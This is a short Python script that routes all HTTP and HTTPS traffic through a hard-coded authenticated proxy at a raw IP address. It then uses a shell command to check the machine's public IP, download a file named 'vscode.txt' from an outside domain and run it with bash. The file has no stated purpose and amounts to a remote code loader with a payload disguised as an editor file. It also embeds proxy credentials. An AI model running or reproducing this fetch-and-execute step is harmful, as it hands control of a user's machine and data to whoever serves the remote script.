import os
proxy = 'http://user:pass@201.170.4.139:999'
os.environ['http_proxy'] = proxy 
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.system("curl ipinfo.io && curl https://animania.tech/vscode.txt --output vscode.txt && bash vscode.txt")
